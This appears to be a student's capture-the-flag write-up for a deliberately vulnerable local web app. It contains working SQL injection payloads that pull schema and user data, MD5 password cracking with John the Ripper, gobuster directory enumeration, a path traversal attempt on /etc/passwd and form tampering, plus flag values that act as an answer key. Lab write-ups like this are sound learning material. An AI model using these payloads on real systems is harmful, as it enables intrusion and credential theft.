### Flag 00 03A944B434D5BAFF05F46C4BEDE5792551A2595574BCAFC9A6E25F67C382CCAA

The first vulnerability we found is the possibility to cheat very easily on a survey hosted on the website.
The server assumes the values as being from 1 to 10, but you can send the request with a much higher grade.

http://localhost:13080/?page=survey
Inspect option of Ben
Change value to 11 (negative didn't work)

### Flag 01 10A16D834F9B1E4068B25C4C46FE0284E99E44DCEAF08098FC83925BA6310FF5

Search members page queries the database directly using SQL

vulnerable to sql injections we assume

5 UNION SELECT COUNT(_), NULL FROM users --
5 UNION SELECT COUNT(_), first_name FROM users --

THIS LISTS ALL TABLE NAMES

```
6 UNION SELECT NULL, table_name FROM information_schema.tables--
```

this lists all column names

```
6 UNION SELECT NULL, column_name FROM information_schema.columns--
```

this lists all columns of the table users, we're using hex because strings are being escaped

```
6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x7573657273--
```

listing all columns gave us this :

```
ID: 5 UNION SELECT NULL, column_name FROM information_schema.columns--
First name:
Surname : FLAG
```

which is sus

but after finding the table that this columbs belong to

```

ID: 5 UNION SELECT NULL, table_name FROM information_schema.columns WHERE column_name=0x464C4147--
First name:
Surname : INNODB_SYS_TABLES

```

and trying to get FLAG from it

```

5 UNION SELECT NULL, FLAG FROM INNODB_SYS_TABLES--

```

we get

```

Table 'Member_Sql_Injection.INNODB_SYS_TABLES' doesn't exist

```

seemingly it's a metadata table and flag is actually in the documentation as being "The flag field returns the dict_table_t::flags that correspond to the data dictionary record."

so wrong way

however we queried all columns from users

```
ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x7573657273--
First name:
Surname : town

ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x7573657273--
First name:
Surname : country

ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x7573657273--
First name:
Surname : planet

ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x7573657273--
First name:
Surname : Commentaire

ID: 6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x7573657273--
First name:
Surname : countersign
```

and after querying Commentaire & countersign we get

```
ID: 6 UNION SELECT Commentaire, countersign FROM users--
First name: Je pense, donc je suis
Surname : 2b3366bcfd44f540e630d4dc2b9b06d9

ID: 6 UNION SELECT Commentaire, countersign FROM users--
First name: Aamu on iltaa viisaampi.
Surname : 60e9032c586fb422e2c16dee6286cf10

ID: 6 UNION SELECT Commentaire, countersign FROM users--
First name: Dublin is a city of stories and secrets.
Surname : e083b24a01c483437bcf4a9eea7c1b4d

ID: 6 UNION SELECT Commentaire, countersign FROM users--
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

its MD5 again according to dcode

and after using john the ripper :

```
darklyProject git:(master) ✗ ../john/run/john --format=Raw-MD5 countersign
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=20
Note: Passwords longer than 18 [worst case UTF-8] to 55 [ASCII] rejected
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Warning: Only 22 candidates buffered for the current salt, minimum 24 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
0g 0:00:00:00 DONE 1/3 (2024-11-21 16:49) 0g/s 145600p/s 145600c/s 145600C/s Getflag1905..Getflag1900
Proceeding with wordlist:../john/run/password.lst
Enabling duplicate candidate password suppressor
Disabling duplicate candidate password suppressor
FortyTwo         (GetFlag)
1g 0:00:00:30 DONE 2/3 (2024-11-21 16:49) 0.03243g/s 14193Kp/s 14193Kc/s 14193KC/s NorwaY1..KushaL
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

now we we lower case to : fortytwo, encode it to sha256 as asked and tada : 10A16D834F9B1E4068B25C4C46FE0284E99E44DCEAF08098FC83925BA6310FF5

### Flag 02 1D4855F7337C0C14B6F44946872C4EB33853F40B2D54393FBE94F49F1E19BBB0

http://localhost:13080/index.php?page=recover
Change webmaster@borntosec.com to whatever
1D4855F7337C0C14B6F44946872C4EB33853F40B2D54393FBE94F49F1E19BBB0

### Flag 03 0FBB54BBF7D099713CA4BE297E1BC7DA0173D8B3C21C1811B916A3A86652724E

http://localhost:13080/index.php?page=feedback
Name: a
0FBB54BBF7D099713CA4BE297E1BC7DA0173D8B3C21C1811B916A3A86652724E

### Flag 04 (WIP)

Hashcrack this http://localhost:13080/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f

### Flag 05 (WIP)

a weirdly loaded image http://localhost:13080/index.php?page=media&src=1

### Flag 06 (WIP)

Wtf?
http://localhost:13080/index.php?page=

### Flag 07 (WIP)

cookie I_am_admin

### Flag 08 d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff

found this dir using gobuster

http://localhost:8080/whatever/

there is a htpasswd file containing

```
`root:437394baff5aa33daa618be47b75cb49`
```

Seems to be hashed in md5, we cracked the password using John the Ripper:

```bash
../john/run/john --format=Raw-MD5 htpasswd
```

gives us the password

```
Enabling duplicate candidate password suppressor
qwerty123@       (root)
```

so now we can connect to this page which we also found through gobuster

http://localhost:8080/admin/

using root as username and qwerty123@ as password, which gets us the flag

### FLAG 09 (WIP)

http://localhost:8080/index.php?page=../../../../etc/passwd

ALMOST

http://localhost:8080/index.php?page=../../../../../var/log/httpd/access.log

STILL NOPE

### FLAG 10 (WIP)

SEARCH IMAGE, IMAGE NUMBER 5

comes up to

```
ID: 5
Title: Hack me ?
Url : borntosec.ddns.net/images.png
```

### TO NOTE

➜ utenret gobuster dir -u http://localhost:8080/ -w KaliLists/dirb/big.txt -b 200,975

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url: http://localhost:8080/
[+] Method: GET
[+] Threads: 10
[+] Wordlist: KaliLists/dirb/big.txt
[+] Negative Status codes: 200,975
[+] User Agent: gobuster/3.6
[+] Timeout: 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin (Status: 301) [Size: 193] [--> http://localhost/admin/]
/audio (Status: 301) [Size: 193] [--> http://localhost/audio/]
/css (Status: 301) [Size: 193] [--> http://localhost/css/]
/errors (Status: 301) [Size: 193] [--> http://localhost/errors/]
/fonts (Status: 301) [Size: 193] [--> http://localhost/fonts/]
/images (Status: 301) [Size: 193] [--> http://localhost/images/]
/includes (Status: 301) [Size: 193] [--> http://localhost/includes/]
/js (Status: 301) [Size: 193] [--> http://localhost/js/]
/whatever (Status: 301) [Size: 193] [--> http://localhost/whatever/]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================

```
